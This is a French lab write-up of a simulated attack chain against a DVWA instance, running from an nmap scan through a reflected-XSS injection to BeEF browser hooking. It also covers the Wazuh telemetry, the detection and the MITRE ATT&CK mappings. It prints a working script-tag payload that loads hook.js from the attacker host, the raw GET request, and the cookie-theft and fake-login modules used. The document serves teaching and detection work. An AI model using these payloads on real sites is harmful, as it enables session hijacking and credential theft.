# Scénario d'Attaque — Chain XSS + BeEF

> **Contexte** : Ce document décrit la chaîne d'attaque simulée dans le laboratoire, de la reconnaissance jusqu'à la compromission du navigateur.

---

## 1. Reconnaissance

L'attaquant (Kali Linux, `192.168.56.10`) identifie la cible `debian-web-01` (`192.168.56.20`) qui héberge une instance DVWA (Damn Vulnerable Web Application) via Docker.

**Actions** :
- Scan réseau : `nmap -sV 192.168.56.20`
- Identification du service : Apache 2.4.25 sur port 80
- Découverte de l'application DVWA et de ses modules d'entraînement

**Résultat** : DVWA expose un module **XSS (Reflected)** non protégé (niveau "Low").

---

## 2. Identification de la Faille

Le module `XSS (Reflected)` accepte une entrée utilisateur dans le paramètre `name` et la renvoie **sans échappement** dans la réponse HTML.

**Test de validation** :
```html
<script>alert(1)</script>
```

**Résultat** : la popup `alert(1)` s'exécute dans le navigateur → **la faille est confirmée**.

---

## 3. Weaponisation — Hook BeEF

L'attaquant prépare son payload. Au lieu d'un simple `alert()`, il utilise le **hook BeEF** :

```html
<script src="http://192.168.56.10:3000/hook.js"></script>
```

**Fonctionnement** :
1. Le navigateur de la victime charge ce script depuis le serveur BeEF
2. Le script `hook.js` s'exécute dans le contexte du navigateur
3. Il enregistre le navigateur auprès de BeEF via des callbacks réguliers
4. BeEF peut alors envoyer des modules d'exploitation à distance

---

## 4. Exploitation — Injection

L'attaquant injecte le payload dans le champ vulnérable de DVWA.

**Requête HTTP générée** :
```http
GET /vulnerabilities/xss_r/?name=<script src="http://192.168.56.10:3000/hook.js"></script> HTTP/1.1
Host: 192.168.56.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
```

**Réponse du serveur** : `HTTP/1.1 200 OK` → l'attaque a réussi.

---

## 5. Post-Exploitation — Contrôle du Navigateur

Une fois le hook chargé, le navigateur de la victime apparaît dans l'interface BeEF sous **"Hooked Browsers"**.

**Informations extraites automatiquement** :

| Champ | Valeur |
|---|---|
| `browser.name` | Firefox |
| `browser.version` | 140.0 |
| `browser.platform` | Linux x86_64 |
| `browser.window.hostname` | 192.168.56.20 |
| `browser.window.referrer` | http://192.168.56.20/vulnerabilities/xss_r/ |
| `browser.window.cookies` | `PHPSESSID=...; security=low` |

**Modules exécutés** :
- **Get Cookie** → extraction du cookie de session DVWA
- **Pretty Theft** → affichage d'une fausse page de login
- **Fake Notification Bar** → affichage d'une fausse notification

---

## 6. Impact

| Élément | Valeur |
|---|---|
| **Système compromis** | `debian-web-01` (192.168.56.20) |
| **Session utilisateur** | `PHPSESSID` volé |
| **Contrôle** | Navigateur de la victime sous contrôle total |
| **Durée** | ~3 minutes entre l'injection et la détection |
| **Sévérité** | **CRITIQUE** (niveau 12 Wazuh) |

---

## 7. Télémétrie Générée

L'attaque laisse des traces dans plusieurs sources :

| Source | Élément généré |
|---|---|
| **Logs Apache** | Requête GET avec payload dans l'URL |
| **Wazuh** | Alerte niveau 12 (règle `100100`) |
| **BeEF** | Navigateur hooké + cookie extrait |
| **Réseau** | Trafic HTTP/WebSocket entre Kali et Debian |

---

## 8. Détection

Voir [`04-detection.md`](04-detection.md) pour l'analyse complète de la détection Wazuh.

---

## 9. Références MITRE ATT&CK

| Technique | ID | Description |
|---|---|---|
| Browser Session Hijacking | **T1185** | Prise de contrôle de session navigateur |
| JavaScript/JScript | **T1059.007** | Exécution de code JavaScript |
| Exploit Public-Facing Application | **T1190** | Exploitation d'une application exposée |

---

*Ce scénario a été réalisé dans un environnement isolé, à des fins éducatives uniquement.*
